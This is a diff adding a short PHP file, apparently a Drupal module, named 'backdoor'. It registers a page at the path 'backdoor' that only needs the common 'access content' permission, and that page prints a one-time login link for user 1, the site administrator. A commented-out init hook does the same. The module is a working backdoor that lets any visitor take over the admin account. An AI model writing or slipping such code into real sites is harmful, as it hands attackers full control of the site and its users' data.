@@ -1,0 +1,25 @@
+<?php
+
+//function backdoor_init (){
+//	$user = user_load(1);
+//	print user_pass_reset_url($user);
+//}
+
+function backdoor_menu(){
+	$items = array();
+
+	$items['backdoor'] = array(
+		'title' => 'Backdoor page',
+		'description' => 'Here generating one time link for login',
+		'page callback' => 'backdoor',
+		'access arguments' => array('access content'),
+		'type' => MENU_NORMAL_ITEM,
+	);
+
+	return $items;
+}
+
+function backdoor (){
+	$user = user_load(1);
+	print user_pass_reset_url($user);
+}
